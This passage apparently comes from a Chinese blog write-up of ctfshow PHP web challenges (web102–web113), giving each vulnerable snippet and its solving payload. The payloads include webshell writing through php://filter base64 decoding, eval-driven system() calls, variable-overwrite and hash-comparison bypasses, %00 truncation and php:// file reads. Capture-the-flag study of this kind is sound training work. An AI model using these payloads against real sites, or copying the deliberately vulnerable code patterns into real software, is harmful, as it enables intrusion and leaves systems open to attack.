class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v4)&#123;</span><br><span class=\"line\">    $s = substr($v2,2);</span><br><span class=\"line\">    $str = call_user_func($v1,$s);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">    file_put_contents($v3,$str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&#x27;hacker&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>substr</code></p>\n<blockquote>\n<p><strong>substr</strong> ( string <code>$string</code> , int <code>$start</code> [, int <code>$length</code> ] ) : string</p>\n<p>返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p>\n</blockquote>\n<p>这里 <code>$s = substr($v2,2);</code>截取了v2的[2:],从第三个字符到末尾</p>\n<p><code>call_user_func</code></p>\n<blockquote>\n<p><strong>call_user_func</strong> ( <a href=\"php/language.types.callable.html\">callable</a> <code>$callback</code> [, <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a> <code>$parameter</code> [, <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a> <code>$...</code> ]] ) : <a href=\"php/language.pseudo-types.html#language.types.mixed\">mixed</a></p>\n<p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。</p>\n</blockquote>\n<p>这里v1，v3可控，v2要保证能写shell，又要保证能为数字。</p>\n<p>这里百思不得其解，看了师傅的wp后，真的要感叹一下，师傅们的创造力啊！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`tac *`;  </span><br></pre></td></tr></table></figure>\n\n<p>这是我们要执行的命令，进行hex编码后为：3c3f3d60746163202a603b ，发现其中有字母<br>于是在此之前进行base64编码一次</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD89YHRhYyAqYDs= //在进行hex编码</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5044383959485268597941715944733d</span><br></pre></td></tr></table></figure>\n\n<p>这时我们发现 <code>3d</code>为等号</p>\n<p>即v1&#x3D;hex2bin  v2&#x3D;00504438395948526859794171594473  v3&#x3D;php:&#x2F;&#x2F;1.php</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:v1=hex2bin</span><br><span class=\"line\"></span><br><span class=\"line\">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>\n\n<p>太妙了！！</p>\n<h3 id=\"web103\"><a href=\"#web103\" class=\"headerlink\" title=\"web103\"></a>web103</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class=\"line\">if($v4)&#123;</span><br><span class=\"line\">    $s = substr($v2,2);</span><br><span class=\"line\">    $str = call_user_func($v1,$s);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;</span><br><span class=\"line\">        file_put_contents($v3,$str);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else&#123;</span><br><span class=\"line\">        die(&#x27;Sorry&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    die(&#x27;hacker&#x27;);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>过滤的更加多了，用上一题的思路也能解出来，我换一个吧</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure>\n\n<p>转化为base64</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PD89YGNhdCAqYDs</span><br></pre></td></tr></table></figure>\n\n<p>再转化为ascii的十六进制</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5044383959474e6864434171594473</span><br></pre></td></tr></table></figure>\n\n<p>我们发现这个很巧妙的里面只有一个字母e，但这里可以将其当成科学计数法，</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v2=005044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web104\"><a href=\"#web104\" class=\"headerlink\" title=\"web104\"></a>web104</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>数组绕过，sha(a[])会返回null  而null&#x3D;&#x3D;null</p>\n<h3 id=\"web105\"><a href=\"#web105\" class=\"headerlink\" title=\"web105\"></a>web105</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&#x27;flag.php&#x27;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$error=&#x27;你还想要flag嘛？&#x27;;</span><br><span class=\"line\">$suces=&#x27;既然你想要那给你吧！&#x27;;</span><br><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;foreach($_POST as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;</span><br><span class=\"line\">die($suces); </span><br></pre></td></tr></table></figure>\n\n<p>这题其实第一做的时候挺懵逼的，后来仔细理清了一下思路，其实就是简单的变量覆盖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class=\"line\">    if($key===&#x27;error&#x27;)&#123;</span><br><span class=\"line\">        die(&quot;what are you doing?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$key=$$value; </span><br></pre></td></tr></table></figure>\n\n<p>这里将我们用GET方式传入的参数当成KEY，参数的值作为VALUE</p>\n<p>最后这里 <code>$$key=$$value;</code> 这里key不能等于error，于是</p>\n<p>我们传入 <code>suces=flag</code></p>\n<p>这样 <code>$suces=$flag</code>这里我们成功将flag的值传给了suces，接下来我们再将seces的值传给error</p>\n<p>同理，我们用post方式传入 <code>error=suces</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$errot=$suces=$flag</span><br></pre></td></tr></table></figure>\n\n<p>最后由于不成立</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class=\"line\">    die($error); </span><br></pre></td></tr></table></figure>\n\n<p>将error打印出来，此时error的值就是flag</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?suces=flag</span><br><span class=\"line\"></span><br><span class=\"line\">POST:error=suces</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web106\"><a href=\"#web106\" class=\"headerlink\" title=\"web106\"></a>web106</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>数组绕过，这里不重复讲了。。</p>\n<h3 id=\"web107\"><a href=\"#web107\" class=\"headerlink\" title=\"web107\"></a>web107</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_POST[&#x27;v1&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v3 = $_GET[&#x27;v3&#x27;];</span><br><span class=\"line\">       parse_str($v1,$v2);</span><br><span class=\"line\">       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;</span><br><span class=\"line\">           echo $flag;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code></p>\n<blockquote>\n<p><strong>parse_str</strong> ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p>\n<p>如果 <code>encoded_string</code> 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 <code>result</code> 则会设置到该数组里 ）。</p>\n</blockquote>\n<p>这里我们传入v3&#x3D;flag</p>\n<p><code>v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</code>（其实就是flag经过md5后的值）</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v3=flag</span><br><span class=\"line\">POST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</span><br></pre></td></tr></table></figure>\n\n<p>另一种思路 md5一个数组的值为null，如果v2这个数组中的flag值也为null，null&#x3D;&#x3D;null</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v3[]=</span><br><span class=\"line\">POST:V1=</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web108\"><a href=\"#web108\" class=\"headerlink\" title=\"web108\"></a>web108</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class=\"line\">    die(&#x27;error&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//只有36d的人才能看到flag</span><br><span class=\"line\">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其实这个题就考了一个知识点</p>\n<p>ereg函数可以用%00截断</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=a%00778</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web109\"><a href=\"#web109\" class=\"headerlink\" title=\"web109\"></a>web109</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class=\"line\">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>正则匹配要求v1和v2要包含字母。题目中eval里的语句，和之前web101有点相似。<br>初始化$v1，v1是个类，$v2()是参数。</p>\n<p>这道题用到了魔术方法__toString()，不少php的内置类里都包含有这个方法，如Reflectionclass、Exception、Error<br><code>__toString()</code>：当一个对象被当作字符串对待的时候，会触发这个魔术方法，格式化输出这个对象所包含的数据。</p>\n<blockquote>\n<p>PHP5.2.0之前，__toString() 方法只在使用 echo 或 print 时才生效。PHP5.2.0之后，可以在任何字符串环境生效</p>\n</blockquote>\n<p>所以echo使得<code>$v1</code>类触发<code>__toString()</code>，传递的参数v2会被输出。</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=CachingIterator&amp;v2=system(ls)</span><br><span class=\"line\">?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web110\"><a href=\"#web110\" class=\"headerlink\" title=\"web110\"></a>web110</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class=\"line\">            die(&quot;error v1&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class=\"line\">            die(&quot;error v2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>\n\n<p>回显fl36dga.txt</p>\n<p>访问url&#x2F;fl36dga.txt得到flag</p>\n<p>其实这里的<code>FilesystemIterator</code>没咋弄懂，还需要找师傅请教一下</p>\n<p>后续</p>\n<p>稍微懂了一点</p>\n<blockquote>\n<p>通过新建FilesystemIterator，可以显示当前目录下的文件结构。由于参数内部有个括号，所以不能使用字符串来索引路径，而是要通过拼接方法getcwd()来获取当前的路径</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\techo getcwd().PHP_EOL;</span><br><span class=\"line\">\techo new FilesystemIterator(&#x27;./&#x27;).PHP_EOL;</span><br><span class=\"line\">\techo new FilesystemIterator(getcwd());</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">输出为</span><br><span class=\"line\">D:\\PHP</span><br><span class=\"line\">  index.php</span><br><span class=\"line\">  index.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web111\"><a href=\"#web111\" class=\"headerlink\" title=\"web111\"></a>web111</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class=\"line\">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class=\"line\">    var_dump($$v1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123;</span><br><span class=\"line\">            die(&quot;error v1&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123;</span><br><span class=\"line\">            die(&quot;error v2&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class=\"line\">            getFlag($v1,$v2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     </span><br></pre></td></tr></table></figure>\n\n<p>当v1传入ctfshow，执行getFlag函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class=\"line\">    var_dump($$v1);</span><br></pre></td></tr></table></figure>\n\n<p>也就是$ctfshow&#x3D;$$v2,然后将$$v1打印出来</p>\n<p>我们另<code>v2=GLOBALS</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web112\"><a href=\"#web112\" class=\"headerlink\" title=\"web112\"></a>web112</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&quot;hacker!&quot;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>is_file</code></p>\n<blockquote>\n<p>判断给定文件名是否为一个正常的文件。</p>\n</blockquote>\n<p>is_file用php伪协议即可绕过</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web113\"><a href=\"#web113\" class=\"headerlink\" title=\"web113\"></a>web113</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function filter($file)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class=\"line\">        die(&#x27;hacker!&#x27;);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return $file;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$file=$_GET[&#x27;file&#x27;];</span><br><span class=\"line\">if(! is_file($file))&#123;</span><br><span class=\"line\">    highlight_file(filter($file));</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;hacker!&quot;;</span><br><span 